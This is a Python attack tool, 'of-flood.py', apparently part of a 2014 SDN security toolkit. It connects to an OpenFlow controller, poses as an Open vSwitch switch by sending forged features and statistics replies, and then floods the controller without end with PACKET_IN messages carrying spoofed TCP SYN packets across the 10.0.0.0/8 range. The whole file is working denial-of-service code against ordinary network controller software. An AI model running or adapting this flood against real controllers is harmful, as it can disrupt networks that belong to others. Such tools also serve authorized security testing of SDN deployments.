#!/usr/bin/env python

"""of-flood.py: Floods Openflow-based controllers"""

__author__ = "Gregory Pickett"
__dated__ = "3/20/2014"
__copyright__ = "Copyright 2014, SDN Toolkit"

__license__ = "GNU General Public License version 3.0 (GPLv3)"
__version__ = "1.0.0"
__maintainer__ = "Gregory Pickett"
__email__ = "gregory.pickett@hellfiresecurity.com"
__twitter__ = "@shogun7273"
__status__ = "Production"

# Socket object needed
import socket

# Import fileinput to load addresses
import fileinput

# Import Argparse for command-line arguments
import argparse

# Header parsing object needed
import struct

# Packet builder object needed
from scapy.all import *

# Utility object needed
import iptools

# The format of the header on all OpenFlow packets.
OFP_HEADER_FORMAT = '!BBHL'
OFP_HEADER_LENGTH = 8

# The version code for the OpenFlow Protocol version 1.0.0.
OFP_VERSION_1_0_0 = 0x01

# OpenFlow message types.
# Immutable messages.
OFPT_HELLO = 0 # Symmetric message.
OFPT_ERROR = 1 # Symmetric message.
OFPT_ECHO_REQUEST = 2 # Symmetric message.
OFPT_ECHO_REPLY = 3 # Symmetric message.
OFPT_VENDOR = 4 # Symmetric message.
# Switch configuration messages.
OFPT_FEATURES_REQUEST = 5 # Controller/switch message.
OFPT_FEATURES_REPLY = 6 # Controller/switch message.
OFPT_GET_CONFIG_REQUEST = 7 # Controller/switch message.
OFPT_GET_CONFIG_REPLY = 8 # Controller/switch message.
OFPT_SET_CONFIG = 9 # Controller/switch message.
# Asynchronous messages.
OFPT_PACKET_IN = 10 # Async message.
OFPT_FLOW_REMOVED = 11 # Async message.
OFPT_PORT_STATUS = 12 # Async message.
# Controller command messages.
OFPT_PACKET_OUT = 13 # Controller/switch message.
OFPT_FLOW_MOD = 14 # Controller/switch message.
OFPT_PORT_MOD = 15 # Controller/switch message.
# Statistics messages.
OFPT_STATS_REQUEST = 16 # Controller/switch message.
OFPT_STATS_REPLY = 17 # Controller/switch message.
# Barrier messages.
OFPT_BARRIER_REQUEST = 18 # Controller/switch message.
OFPT_BARRIER_REPLY = 19 # Controller/switch message.
# Queue Configuration messages.
OFPT_QUEUE_GET_CONFIG_REQUEST = 20 # Controller/switch message.
OFPT_QUEUE_GET_CONFIG_REPLY = 21 # Controller/switch message.

# OFPT_FLOW_MOD message commands.
OFPFC_ADD = 0
OFPFC_MODIFY = 1
OFPFC_MODIFY_STRICT = 2
OFPFC_DELETE = 3
OFPFC_DELETE_STRICT = 4

# Process command-line arguments
argParser = argparse.ArgumentParser(description='Floods Openflow-based controllers')
argParser.add_argument('--version', '-v', action='version', version='%(prog)s is at version 1.0.0')
argParser.add_argument('ip', type=str, help='Address of the controller')
argParser.add_argument('-p','--port', default=6633,type=int, help='Openflow port')
arguments = argParser.parse_args()

if arguments.ip != None:

	# Assign target controller
	ip = arguments.ip
	
	#
	try:
		client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		client_socket.connect((ip, arguments.port))	

		# Build Hello
		type = OFPT_HELLO
		length = OFP_HEADER_LENGTH
		xid = 0
		header = struct.pack(OFP_HEADER_FORMAT, OFP_VERSION_1_0_0, type, length, xid)
		client_socket.send(header)

		while(True):
		
			# Listen for response ...
			data = client_socket.recv(512)

			#
			version, msg_type, msg_length, xid = struct.unpack(OFP_HEADER_FORMAT, data[:8])

			#
			if msg_type == OFPT_HELLO:
				
				# Acknowledge Hello Exchange
				print('Hello\'s Exchanged')
				
				# Change state
				
				state = OFPT_HELLO
				
				
			elif msg_type == OFPT_FEATURES_REQUEST:
			
				# Only if Hello Exchange complete
				if state == OFPT_HELLO:

					# Acknowledge Features Request
					print('Received Feature Request')
				
					# Reply with bogus features from Openvswitch
					type = OFPT_FEATURES_REPLY
					length = 128
					xid = 0
					data = '\x00\x00\x00\x0c\x29\x55\xde\x2b\x00\x00\x01\x00\x01\x00\x00\x00\x00\x00\x00\x87\x00\x00\x0f\xff\xff\xfe\x00\x0c\x29\x55\xde\x2b\x62\x72\x2d\x69\x6e\x74\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x0c\x29\x55\xde\x2b\x65\x74\x68\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
					header = struct.pack(OFP_HEADER_FORMAT, OFP_VERSION_1_0_0, type, length, xid)
					client_socket.send(header+data)

					# Acknowledge Features Sent
					print('Sent Feature Reply')
					
				else:
				
					#
					pass
			
			elif msg_type == OFPT_SET_CONFIG:
			
				# Only if Hello Exchange complete
				if state == OFPT_HELLO:
				
					# Acknowledge Config Set
					print('Received Config Set')
				
					# Record configuration
					config, max = struct.unpack("HH", data[8:12])
				
				else:
				
					#
					pass
			
			elif msg_type == OFPT_GET_CONFIG_REQUEST:
			
				# Only if Hello Exchange complete
				if state == OFPT_HELLO:

					# Acknowledge Config Request
					print('Received Config Request')
				
					# Mirror configuration
					type = OFPT_GET_CONFIG_REPLY
					length = 12
					xid = 0
					data = struct.pack('!HH', config, max)
					header = struct.pack(OFP_HEADER_FORMAT, OFP_VERSION_1_0_0, type, length, xid)
					client_socket.send(header+data)					

					# Acknowledge Config Reply
					print('Sent Config Reply')

					# OFPT_GET_CONFIG_REPLY response time slow ... Missing OFPT_STATS_REQUEST
					# Sending bogus stats from Openvswitch
					type = OFPT_STATS_REPLY
					length = 1068
					xid = 0
					data = '\x00\x00\x00\x00\x4e\x69\x63\x69\x72\x61\x20\x4e\x65\x74\x77\x6f\x72\x6b\x73\x2c\x20\x49\x6e\x63\x2e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4f\x70\x65\x6e\x20\x76\x53\x77\x69\x74\x63\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x31\x2e\x32\x2e\x30\x2b\x62\x75\x69\x6c\x64\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4e\x6f\x6e\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4e\x6f\x6e\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
					header = struct.pack(OFP_HEADER_FORMAT, OFP_VERSION_1_0_0, type, length, xid)
					client_socket.send(header+data)			

					# Acknowledge Stats Reply
					print('Sent Stats Reply')

					# Announce Flood
					print('Starting Flood ...1')

					#
					buffer_id = 99
					ip_range = iptools.IpRange("10.0.0.1", "10.255.255.255")
					
					while(True):
					
						# Send Packet In
						
						for nw_src in ip_range:
							for nw_dst in ip_range:
								for tp_src in range(1, 65535):
									for tp_dst in range(1, 65535):
										for in_port in range(1, 65535):
									
											# Prepare TCP Packet
											pkt = Ether()/IP(src=nw_src,dst=nw_dst)/TCP(sport=tp_src,dport=tp_dst,flags="S")
											spkt1 = str(pkt)
											
											#
											type = OFPT_PACKET_IN
											length = OFP_HEADER_LENGTH + 10 + len(spkt1)
											xid = 0
											header = struct.pack(OFP_HEADER_FORMAT, OFP_VERSION_1_0_0, type, length, xid)
											
											#
											buffer_id = buffer_id + 1
											total_len = len(spkt1)
											reason = 0
											padding = 0
											message = struct.pack('!LHHBx', buffer_id, total_len, in_port, reason)
											
											#
											client_socket.send(header+message+spkt1)
					
				else:
				
					#
					pass
			
			elif msg_type == OFPT_STATS_REQUEST:
			
				# Only if Hello Exchange complete
				if state == OFPT_HELLO:

					# Acknowledge Stats Request
					print('Received Stats Request')				
				
					# Reply with bogus stats from Openvswitch
					type = OFPT_STATS_REPLY
					length = 1068
					xid = 0
					data = '\x00\x00\x00\x00\x4e\x69\x63\x69\x72\x61\x20\x4e\x65\x74\x77\x6f\x72\x6b\x73\x2c\x20\x49\x6e\x63\x2e\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4f\x70\x65\x6e\x20\x76\x53\x77\x69\x74\x63\x68\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x31\x2e\x32\x2e\x30\x2b\x62\x75\x69\x6c\x64\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4e\x6f\x6e\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4e\x6f\x6e\x65\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
					header = struct.pack(OFP_HEADER_FORMAT, OFP_VERSION_1_0_0, type, length, xid)
					client_socket.send(header+data)			

					# Acknowledge Stats Reply
					print('Sent Stats Reply')
					# Announce Flood
					print('Starting Flood ...2')

					#
					buffer_id = 99
					ip_range = iptools.IpRange("10.0.0.2", "10.255.255.255")
					
					while(True):
					
						# Send Packet In
						
						for nw_src in ip_range:
							for nw_dst in ip_range:
								for tp_src in range(1, 65535):
									for tp_dst in range(1, 65535):
										for in_port in range(1, 65535):
									
											# Prepare TCP Packet
											pkt = Ether()/IP(src=nw_src,dst=nw_dst)/TCP(sport=tp_src,dport=tp_dst,flags="S")
											spkt1 = str(pkt)
											
											#
											type = OFPT_PACKET_IN
											length = OFP_HEADER_LENGTH + 10 + len(spkt1)
											xid = 0
											header = struct.pack(OFP_HEADER_FORMAT, OFP_VERSION_1_0_0, type, length, xid)
											
											#
											buffer_id = buffer_id + 1
											total_len = len(spkt1)
											reason = 0
											padding = 0
											message = struct.pack('!LHHBx', buffer_id, total_len, in_port, reason)
											
											#
											client_socket.send(header+message+spkt1)	
					
				else:
				
					#
					pass
			
			elif msg_type == OFPT_ECHO_REQUEST:
			
				# Only if Hello Exchange complete
				if state == OFPT_HELLO:

					# Acknowledge Echo Request
					print('Received Echo Request')	
				
					# Send Reply
					type = OFPT_ECHO_REPLY
					length = OFP_HEADER_LENGTH
					xid = 8
					header = struct.pack(OFP_HEADER_FORMAT, OFP_VERSION_1_0_0, type, length, xid)
					client_socket.send(header)					

					# Acknowledge Echo Reply
					print('Sent Echo Reply')

				else:
				
					#
					pass
		
			else:
			
				#  
				pass

	except socket.timeout:
		
		# Acknowledge timeout
		print('Timeout!')
		
	except socket.error:
	
		# Acknowledge error
		print('Error!')
